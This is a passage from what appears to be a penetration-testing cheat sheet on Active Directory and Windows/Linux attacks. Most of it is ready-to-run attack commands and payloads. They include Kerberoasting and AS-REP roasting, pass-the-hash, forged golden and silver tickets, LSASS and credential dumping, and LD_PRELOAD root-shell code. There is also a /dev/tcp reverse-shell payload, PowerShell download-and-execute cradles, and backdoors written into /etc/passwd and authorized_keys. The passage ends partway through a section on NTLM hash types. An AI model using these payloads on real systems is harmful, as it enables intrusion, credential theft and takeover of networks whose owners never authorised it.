$ impacket-getTGT <DOMAIN>/<USERNAME> -dc-ip <DOMAIN> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
```

### impacket-GetNPUsers

```c
$ impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
$ impacket-GetNPUsers <DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>
$ impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format john -outputfile hashes
```

### impacket-getUserSPNs

```c
$ impacket-GetUserSPNs -request -dc-ip <RHOST> <DOMAIN>/<USERNAME>
```

```c
$ export KRB5CCNAME=<USERNAME>.ccache
$ impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<DOMAIN> -no-pass -request
```

### impacket-secretsdump

```c
$ impacket-secretsdump <DOMAIN>/<USERNAME>@<RHOST>
$ impacket-secretsdump -dc-ip <RHOST> <DOMAIN>/<SUERNAME>:<PASSWORD>@<RHOST>
$ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
$ impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
```

```c
$ export KRB5CCNAME=<USERNAME>.ccache
$ impacket-secretsdump -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass -debug
```

### impacket-psexec

```c
$ impacket-psexec <USERNAME>@<RHOST>
$ impacket-psexec <DOMAIN>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
```

### impacket-ticketer

#### Requirements

* Valid User
* NTHASH
* Domain-SID

```c
$ export KRB5CCNAME=<USERNAME>.ccache
$ impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <DOMAIN> -spn MSSQLSVC/<RHOST>.<DOMAIN> -user-id 500 Administrator
```

#### Fixing [-] exceptions must derive from BaseException

##### Issue

```c
$ impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<DOMAIN> -no-pass -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] exceptions must derive from BaseException
```

#### To fix it

```c
241         if self.__doKerberos:
242             #target = self.getMachineName()
243             target = self.__kdcHost
```

### ntlmrelayx

```c
$ sudo ntlmrelayx.py -t ldap://<RHOST> --no-wcf-server --escalate-user <USERNAME>
```

### dacledit.py

> https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py

```c
$ python3 dacledit.py <DOMAIN>/<USERNAME>:<PASSWORD> -k -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' -dc-ip <RHOST> -action read -principal '<USERNAME>' -target '<GROUP>' -debug
```

#### Fixing msada_guids Error

```c
#from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
```

Then put the `msada_guids.py` into the same directory as `dacledit.py`

> https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/helpers/msada_guids.py

### owneredit.py

> https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py

```c
$ python3 owneredit.py -k '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <RHOST> -action write -new-owner '<USERNAME>' -target '<GROUP>' -debug
```

### ThePorgs Fork

```c
$ pipenv shell
$ git clone https://github.com/ThePorgs/impacket/
$ pip3 install -r requirements.txt
$ sudo python3 setup.py install
```

## Internet Information Service (IIS)

### Application Pool Credential Dumping

```c
C:\Windows\System32\inetsrv>appcmd.exe list apppool /@:*
```

## JAWS

> https://github.com/411Hall/JAWS

```c
PS C:\> IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.ps1')
```

## Kerberos

### Authentication

> https://csforza.gitbook.io/pentesting-articles-and-notes/windows/active-directory/kerberos-authentication

If a user wants to obtain access to resources within a Active Directory network, he must obtain a ticket through a `6-step` process.

1. User sends a request to the `Kerberos Distribution Center (KDC)` with his password hash and a timestamp. (AS-REQ)
2. If the `password hash` of the user matches that for the user on the `KDC`, the user receives a `Ticket Granting Ticket` encrypted and signed by the `krbtgt` account. (AS-REP)
3. The `TGT`, including the `krbtgt hash`, is sent to the `KDC` or `DC` in order to recieve a `Kerberos Service Ticket (TGS)`. (TGS-REQ)
4. User then receives a `TGS` encrypted with the `hash` of the service account he wishes to access. (TGS-REP)
5. User then connects to the server and attempts to use the service he sent the `initial request` for with the `TGS` included. (AP-REQ)
6. User gains access and mutual authentication is given between the server and client if necessary (AP-REP).

#### Constrained Delegation

> https://csforza.gitbook.io/pentesting-articles-and-notes/windows/active-directory/privilege-escalation/constrained-delegation

> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation

- `Constrained Delegation` limits the services to which a service can access on behalf of a user.
- This service account must still be `trusted` to `delegate`.
- The user does `not authenticate` with `Kerberos` to the `constrained service`.
- Instead of authenticating to the `KDC` first, like in a regular Kerberos ticket request, the user authenticates `directly to the service`.
- Once the user authenticates to the service, the service then requests a `forwardable TGT` to the `KDC` without the user's password included.
- The `KDC` checks the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` attribute on the service and whether or not the user's account is blocked.
- If everything checks out a ticket is returned.
- Ticket gets `passed back` to the `KDC` and a `TGS ticket` is requested to the `second service`.
- `KDC` checks the `msDS-AllowedToDelegateTo` field on the second service and if it is listed, then an `access ticket` is granted.
- `TGS` gets sent to the next service and the user now can authenticate to it.

The `Service for User (S4U)` extension is used to aid the impersonation process when `Constrained Delegation` is used. The extension has two extensions within it:

- `Service for User to Self (S4U2Self)`: This allows a service to obtain a `forwardable TGS` to itself on the user's behalf with the `User Principal Name` supplied. No password is included.
- `Service for User to Proxy (S4U2proxy)`: This allows the service to `obtain` the required `TGS` on the user's behalf to the second service the user needs to connect to. This second service will have the `msDS-AllowedToDelegateTo` attribute given to it. User tokens can be forwarded to those `SPN's` which have this attribute given.

Delegation occurs not only for the specified service, but also for ANY service running under the account that is running the service.

#### Unconstrained Delegation

> https://csforza.gitbook.io/pentesting-articles-and-notes/windows/active-directory/privilege-escalation/unconstrained-delegation

> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation

Kerberos Delegation allows for users to access resources on another server via a service that the user has access to. The service the user is connected to impersonates that user by resusing his credentials which then allows the user to gain access to that server.

- When `Unconstrained Delegation` is enabled, the user's `TGT` is sent along with the `TGS` to the first hop service. That `TGT` gets stored in the server's `LSASS` which allows the service to take it out and delegate with it if necessary.
- Accounts or services with `Unconstrained Delegation` can be escalated to an account with higher privileges, if a Domain Admin or a higher privileged user connecting to that machine.
- The `TGT` can be extracted and the ticket `reused`.

#### Resource-based Constrained Delegation (RBCD)

> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution

> https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/

> https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview

- In `unconstrained` and `constrained Kerberos delegation`, a `computer/user` is told what resources it can delegate authentications to.
- In `Resource-based Kerberos Delegation`, computers (resources) specify who they `trust` and who can `delegate` authentications to them.
- By supporting constrained delegation across domains, `services` can be `configured` to use `constrained delegation` to `authenticate` to `servers` in other domains rather than using unconstrained delegation.
- This provides `authentication support` for across domain service solutions by using an existing Kerberos infrastructure `without` needing to trust `front-end services` to delegate to any service.

##### Prerequisites

- Populate the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute with a computer account that will be controlled.
- Know a `SPN` set on the object to gain access.
- Create a new `computer account` using PowerMad (allowed due to the default MachineAccountQuota value).
- Leverage Rubeus to abuse `Resource-Based Constrained Delegation`.

#### Kerberoasting

> https://csforza.gitbook.io/pentesting-articles-and-notes/windows/active-directory/privilege-escalation/kerberoasting

> https://xedex.gitbook.io/internalpentest/internal-pentest/active-directory/post-compromise-attacks/kerberoasting

- All user accounts that have `Service Principal Names (SPN's)` set can be kerberoasted.
- Relatively silent technique because it leaves only one `4769 ID event` on the log.

#### AS-REP Roasting

> https://csforza.gitbook.io/pentesting-articles-and-notes/windows/active-directory/privilege-escalation/as-rep-roasting

> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat

ASPREPRoast is about retrieving crackable hashes from `KRB5 AS-REP` responses for users without `kerberoast preauthentication` enabled. This isn't as useful as Kerberoasting, as accounts have to have `DONT_REQ_PREAUTH` explicitly set for them to be vulnerable and you are still reliant upon weak password complexity for the attack to work.

- `AS-REP roasting` is a technique that allows retrieving password hashes for users that have `Do not require Kerberos preauthentication` property selected.
- Those hashes can then be cracked offline.

#### Silver, Golden and Diamond Tickets

- Silver Ticket is a forged service authentication ticket (Service Principal Name (SPN) and Machine Account Keys (Hash in RC4 or AES) needed). Silver Tickets do not touch the Domain Controller (DC).
- Golden Ticket is a Ticket Granting Ticket (TGT) and completely forged offline (KRBTGT Account Hash needed).
- Diamond Ticket is essentially a Golden Ticket but requested from a Domain Controller (DC).

### Attacking Kerberos

> https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

#### Bruteforce

```c
$ ./kerbrute -domain <DOMAIN> -users <FILE> -passwords <FILE> -outputfile <FILE>
```

##### With List of Users

```c
C:\> .\Rubeus.exe brute /users:<FILE> /passwords:<FILE> /domain:<DOMAIN> /outfile:<FILE>
```

##### Check Passwords for all Users in Domain

```c
C:\> .\Rubeus.exe brute /passwords:<FILE> /outfile:<FILE>
```

#### ASPREPRoast

##### Check ASPREPRoast for all Domain Users (Credentials required)

```c
$ impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format hashcat -outputfile <FILE>
$ impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format john -outputfile <FILE>
```

##### Check ASPREPRoast for a List of Users (No Credentials required)

```c
$ impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format hashcat -outputfile <FILE>
$ impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format john -outputfile <FILE>
```

##### Check ASPREPRoast for all Domain Users in Domain

```c
C:\> .\Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
```

##### Kerberoasting

```c
$ impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
C:\> .\Rubeus.exe kerberoast /outfile:<FILE>
PS C:\> iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
PS C:\> Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
PS C:\> Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
```

#### Overpass The Hash/Pass The Key (PTK)

##### Request TGT with Hash

```c
$ impacket-getTGT <DOMAIN>/<USERNAME> -hashes <LMHASH>:<NTLMHASH>
```

##### Request TGT with aesKey (More secure Encryption, probably more stealth due is it used by Default)

```c
$ impacket-getTGT <DOMAIN>/<USERNAME> -aesKey <KEY>
```

##### Request TGT with Password

```c
$ impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
```

##### Set TGT for Impacket Usage

```c
$ export KRB5CCNAME=<USERNAME>.ccache
```

##### Execute Remote Commands

```c
$ impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

##### Ask and inject the Ticket

```c
C:\> .\Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /rc4:<NTLMHASH> /ptt
```

##### Execute a CMD on Remote Host

```c
C:\> .\PsExec.exe -accepteula \\<RHOST> cmd
```

#### Pass The Ticket (PTT)

##### Harvest Tickets from Linux

###### Check Type and Location of Tickets

```c
$ grep default_ccache_name /etc/krb5.conf
```

* If none return, default is FILE:/tmp/krb5cc_%{uid}
* In Case of File Tickets it is possible to Copy-Paste them to use them
* In Case of being KEYRING Tickets, the Tool tickey can be used to get them
* To dump User Tickets, if root, it is recommended to dump them all by injecting in other user processes
* To inject, the Ticket have to be copied in a reachable Folder by all Users

```c
$ cp tickey /tmp/tickey
$ /tmp/tickey -i
```

##### Harvest Tickets from Windows

```c
mimikatz # sekurlsa::tickets /export
$ .\Rubeus dump
```

##### Convert Tickets dumped with Rubeus into base64

```c
[IO.File]::WriteAllBytes("<TICKET>.kirbi", [Convert]::FromBase64String("<TICKET>"))
```

##### Convert Tickets between Linux and Windows Format with ticket_converter.py

> https://github.com/Zer1t0/ticket_converter

```c
$ python ticket_converter.py ticket.kirbi ticket.ccache
$ python ticket_converter.py ticket.ccache ticket.kirbi
```

##### Using Ticket on Linux

```c
$ export KRB5CCNAME=<USERNAME>.ccache
```

##### Execute Remote Commands by using TGT

```c
$ impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

##### Using Ticket on Windows

###### Inject Ticket with mimikatz

```c
mimikatz # kerberos::ptt <KIRBI_FILE>
```

###### Inject Ticket with Rubeus

```c
C:\> .\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

###### Execute a CMD on Remote Host

```c
C:\> .\PsExec.exe -accepteula \\<RHOST> cmd
```

#### Silver Ticket

##### Impacket Examples

###### Generate TGS with NTLM

```c
$ python ticketer.py -nthash <NTLMHASH> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```

###### Generate TGS with aesKey

```c
$ python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```

###### Set the ticket for impacket use

```c
$ export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands by using TGT

```c
$ impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

##### mimikatz Examples

###### Generate TGS with NTLM

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

###### Generate TGS with AES 128bit Key

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

###### Generate TGS with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

###### Inject TGS with Mimikatz

```c
mimikatz # kerberos::ptt <KIRBI_FILE>
```

##3## Rubeus Examples

```c
C:\> .\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

###### Execute CMD on Remote Host

```c
C:\> .\PsExec.exe -accepteula \\<RHOST> cmd
```

#### Golden Ticket

##### Impacket Examples

###### Generate TGT with NTLM

```c
$ python ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```

###### Generate TGT with aesKey

```c
$ python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```

###### Set TGT for Impacket Usage

```c
$ export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands by using TGT

```c
$ impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

##### mimikatz Examples

###### Generate TGT with NTLM

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<USERNAME>
```

###### Generate TGT with AES 128bit Key

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME>
```

###### Generate TGT with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME>
```

###### Inject TGT with Mimikatz

```c
mimikatz # kerberos::ptt <KIRBI_FILE>
```

##### Rubeus Examples

###### Inject Ticket with Rubeus

```c
C:\> .\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

###### Execute CMD on Remote Host

```c
C:\> .\PsExec.exe -accepteula \\<RHOST> cmd
```

###### Get NTLM from Password

```c
$ python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).digest())'
```

## Kiosk Breakout

### Using Microsoft Edge

> https://blog.nviso.eu/2022/05/24/breaking-out-of-windows-kiosks-using-only-microsoft-edge/

```c
<script>
    function shlExec() {
        var cmd = document.getElementById('cmd').value
        var shell = new ActiveXObject("WScript.Shell");
        try {
            var execOut = shell.Exec("cmd.exe /C \"" + cmd + "\"");
        } catch (e) {
            console.log(e);
        }
 
        var cmdStdOut = execOut.StdOut;
        var out = cmdStdOut.ReadAll();
        alert(out);
    }
</script>
 
<form onsubmit="shlExec()">
    Command: <input id="cmd" name="cmd" type="text">
    <input type="submit">
</form> 
```

Copy a `cmd.exe` binary to the download directory of the default user `KioskUser0`.

```c
copy C:\Windows\System32\cmd.exe C:\Users\KioskUser0\Downloads\msedge.exe
```

## Krbrelayx

> https://github.com/dirkjanm/krbrelayx

### Abuse DNS Delegation Zones with dnstool.py

```c
$ python3 dnstool.py -u 'domain\<USERNAME>' -p '<PASSWORD>' -a add -r '<TO_ABUSE>.<DOMAIN>' -d <LHOST> <RHOST>
```

## LAPS

```c
PS C:\Users\<USERNAME>\Documents> $Computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime
PS C:\Users\<USERNAME>\Documents> $Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-Adm-PwdExpirationTime
```

## LDAP

> https://github.com/infosecn1nja/AD-Attack-Defense

> https://www.poweradmin.com/blog/restoring-deleted-objects-from-active-directory-using-ad-recycle-bin/

> https://adsecurity.org/?p=2288

### Queries

```c
$ (New-Object adsisearcher((New-Object adsi("LDAP://dc.<DOMAIN>","<DOMAIN>\<USERNAME>","<PASSWORD>")),"(objectCategory=Computer)")).FindAll() | %{ $_.Properties.name }
$ (New-Object adsisearcher((New-Object adsi("LDAP://dc.<DOMAIN>","<DOMAIN>\<USERNAME>","<PASSWORD>")),"(info=*)")).FindAll() | %{ $_.Properties }
```

## ldapmodify

```c
$ ldapmodify -x -H ldap://<RHOST> -d 1 -D CN=<USERNAME>,CN=<GROUP>,DC=<DOMAIN>,DC=local -W <<EOF
dn: CN=<USERNAME>,OU=<GROUP>,DC=<DOMAIN>,DC=local
changetype: modify
replace: unicodePwd
unicodePwd::UABhACQAJAB3ADAAcgBkAA==
EOF
```

## ldapsearch

```c
$ ldapsearch -x -h <RHOST> -s base namingcontexts
$ ldapsearch -H ldap://<RHOST> -x -s base -b '' "(objectClass=*)" "*" +
$ ldapsearch -H ldaps://<RHOST>:636/ -x -s base -b '' "(objectClass=*)" "*" +
$ ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local"
$ ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local" | grep descr -A 3 -B 3
$ ldapsearch -x -h <RHOST> -b "dc=<RHOST>,dc=local" "*" | awk '/dn: / {print $2}'
$ ldapsearch -x -h <RHOST> -D "<USERNAME>" -b "dc=<DOMAIN>,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
$ ldapsearch -H ldap://<RHOST> -D <USERNAME> -w "<PASSWORD>" -b "CN=Users,DC=<RHOST>,DC=local" | grep info
```

### Handle Kerberos Authentication

```c
$ LDAPTLS_REQCERT=never ldapsearch -x -W -D "<USERNAME>@<DOMAIN>" -b "dc=<DOMAIN>,dc=local" -H ldaps://<RHOST> "samaccountname=*"
```

## LD_PRELOAD

> https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

### shell.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

or

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

### Compiling

```c
$ gcc -o <SHARED_OBJECT>.so <FILE>.c -shared -FPIC -nostartfiles 
```

### Privilege Escalation

```c
$ sudo LD_PRELOAD=/PATH/TO/SHARED_OBJECT/<SHARED_OBJECT>.so <BINARY>
```

## LD_LIBRARY_PATH

### Get Information about Libraries

```c
$ ldd /PATH/TO/BINARY/<BINARY>
```

### shell.c

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

### Compiling

```c
$ gcc -o <LIBRARY>.so.<NUMBER> -shared -fPIC <FILE>.c
```

### Privilege Escalation

```c
$ sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/<LIBRARY>.so.<NUMBER> <BINARY>
```

## Libre Office

### Enable Macros via Registry

> https://admx.help/?Category=LibreOffice-from-Collabora&Policy=Collabora.Policies.LibreOffice::MacroSecurityLevel

```c
C:\> Set-ItemProperty -Path "HKLM:\Software\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" -Name "Value" -Value 0
```

## Linux

### adduser.sh

```c
#!/bin/bash
echo '<USERNAME>:BP9vDdYHNP.Mk:0:0:root:/root:/bin/bash' >> /etc/passwd
```

### capsh

```c
$ capsh --print
```

## Linux Wildcards

> https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

With the command `touch -- --checkpoint=1` will be a file created. Why? Because the `--` behind the command `touch` is telling touch, that there's option to be wait for. 
Instead of an option, it creates a file, named `--checkpoint=1`.

```c
$ touch -- --checkpoint=1
```

or

```c
$ touch ./--checkpoint=1
```

So after creating the `--checkpoint=1` file, i created another file, which executes a shell script.

```c
$ touch -- '--checkpoint-action=exec=sh shell.sh'
```

or 

```c
$ touch ./--checkpoint-action=exec=<FILE>
```

To delete a misconfigured file, put a `./` in front of it.

```c
$ rm ./'--checkpoint-action=exec=python script.sh'
```

## logrotten

> https://github.com/whotwagner/logrotten

### Skeleton Payload

```c
if [ `id -u` -eq 0 ]; then ( /bin/sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 ); fi
```

### Syntax

#### If "create"-option is set in logrotate.cfg

```c
$ ./logrotten -p ./payloadfile /tmp/log/pwnme.log
```

#### If "compress"-option is set in logrotate.cfg

```c
$ ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
```

## Lsass

### Dump

```c
C:\> tasklist
C:\> rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 688 C:\Users\Administrator\Documents\lsass.dmp full
```

## Lua

### Code Execution

```c
file = io.open("/root/.ssh/authorized_keys", "w")
file:write("ssh-rsa AAAAB3N--- snip ---YM5syQ==")
file:close()
```

## machinectl

```c
$ machinectl shell --uid=root
```

## Microsoft Windows

### Common Commands

```c
C:\> tree /f C:\Users\
C:\> tasklist /SVC
C:\> sc query
C:\> sc qc <SERVICE>
C:\> netsh firewall show state
C:\> schtasks /query /fo LIST /v
C:\> findstr /si password *.xml *.ini *.txt
C:\> dir /s *pass* == *cred* == *vnc* == *.config*
C:\> accesschk.exe -uws "Everyone" "C:\Program Files"
C:\> wmic qfe get Caption,Description,HotFixID,InstalledOn
C:\> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```

### User Enumeration

```c
C:\> net user
C:\> net user /domain
C:\> dir C:\Users
C:\> cmd.exe /c echo %username%
PS C:\> echo $env:username
```

### Adding Users to Groups

```c
C:\> net user <USERNAME> <PASSWORD> /add /domain
C:\> net group "Exchange Windows Permissions" /add <USERNAME>
C:\> net localgroup "Remote Management Users" /add <USERNAME>
```

### Show Hidden Files and Folders

```c
C:\> dir /a      // show hidden folders
C:\> dir /a:d    // show all hidden directories
C:\> dir /a:h    // show all hidden files
PS C:\> cmd /c dir /A      // show hidden folders
PS C:\> cmd /c dir /A:D    // show all hidden directories
PS C:\> cmd /c dir /A:H    // show all hidden files
```

### Enable WinRM

```c
C:\> winrm quickconfig
```

### Enable Remote Desktop (RDP)

```c
C:\> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
C:\> netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

or

```c
PS C:\> Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0;
PS C:\> Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1;
PS C:\> Enable-NetFirewallRule -DisplayGroup "Remote Desktop";
```

### Firewall Handling

#### Common Commands

```c
PS C:\> get-netfirewallrule -all
PS C:\> get-netfirewallrule -policystore configurableservicestore -all
PS C:\> New-NetFirewallRule -DisplayName '<NAME>' -Profile 'Private' -Direction Inbound -Action Allow -Protocol TCP -LocalPort <LPORT>
PS C:\> New-NetFirewallRule -DisplayName '<NAME>' -Profile 'Private' -Direction Inbound -Action Deny -Protocol TCP -LocalPort <LPORT>
PS C:\> Enable-NetFirewallRule -DisplayName "<NAME>"
PS C:\> Disable-NetFirewallRule -DisplayName "<NAME>"
```

#### Allow all outgoing Traffic

```c
PS C:\> New-NetFirewallRule -DisplayName "Allow all outbound traffic" -Direction Outbound -Action Allow
PS C:\> Enable-NetFirewallRule -DisplayName "Allow all outbound traffic"
```

### Port Forwarding

#### Check Port Forwardings

```c
C:\> netsh interface portproxy show all
```

#### Set Port Forwarding

```c
C:\> netsh interface portproxy add v4tov4 listenport=<RPORT> listenaddress=<RHOST> connectport=8443 connectaddress=<LHOST>
```

#### Create Port Forwarding Firewall Rule

```c
C:\> advfirewall firewall add rule name="<NAME>" protocol=TCP dir=in localip=<RHOST> localport=<RPORT> action=allow
```

#### Delete specific Forwarding

```c
C:\> netsh interface portproxy delete v4tov4 listenport=80 listenaddress=127.0.0.1
```

#### Remove all existing Forwardings

```c
C:\> netsh interface portproxy reset
```

### Hashes

> https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4

> https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

- LM Hashes are deprecated and so there are replaced by an empty string (aad3b435b51404eeaad3b435b51404ee).
- If a `Hash` starts with `31d6`, chances are pretty good, that there is no `Password`
set for the user.

#### LM

- `Oldest` password storage used by `Microsoft Windows`
- If available, they can be obtained from `SAM` databases on a `Microsoft Windows` system or from the `NTDS` database of a `Domain Controller`
- When dumping `SAM/NTDS` databases, they are shown together within the `NTHash` before the colon
- Can be used for `Pass-The-Hash`

##### Example

```c
299BD128C1101FD6
```

##### Algorithm

1. Convert all `lower case` to `upper case`
2. Pad password to `14` characters with NULL characters
3. Split the password to two `7` character chunks
4. Create two `DES` keys from each `7` character chunk
5. DES `encrypt` the string "KGS!@#$%" with these two `chunks`
6. `Concatenate` the two DES encrypted strings. This is the LM hash.

##### Cracking

```c
$ john --format=lm <FILE>
$ hashcat -m 3000 -a 3 <FILE>
```

#### NTHash (NTLM)

- The way how passwords are stored on `modern` `Microsoft Windows` systems
- Can be optained by dumping the `SAM` database or using `mimikatz`
- They are also stored in the `NTDS` file on `Domain Cotnrollers`
- Can be used for `Pass-The-Hash`

##### Example

```c
B4B9B02E6F09A9BD760F388B67351E2B
```

##### Algorithm

```c
MD4(UTF-16-LE(password))
```

##### Cracking

```c
$ john --format=nt <FILE>
$ hashcat -m 1000 -a 3 <FILE>
```

#### Net-NTLMv1 (NTLMv1)

- `NTLM` protocol uses the `NTHash` in `Challenge-Response` between a `server` and a `client`
- The `v1` of the protocol uses both, the `NT` hash and the `LM` hash, depending on configuration and what is available.
- Can be obtained by using `Responder`
- Values for cracking are `K1`, `K2` or `K3` from the algorithm
- Version 1 is `deprecated` but still used in some old systems on the network
- Can be used for `Relaying`

##### Example

```c
u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
```

##### Algorithm

```c
C = 8-byte server challenge, random
K1 | K2 | K3 = LM/NT-hash | 5-bytes-0
response = DES(K1,C) | DES(K2,C) | DES(K3,C)
```

##### Cracking

```c
$ john --format=netntlm <FILE>
$ hashcat -m 5500 -a 3 <FILE>
```

#### Net-NTLMv2 (NTLMv2)

- New and improved version of the `NTLM` protocol
- Harder to crack
- Same concept as `NTLMv1`, only with a different algorithm and response sent to the server
- Can also be captured by using `Responder`
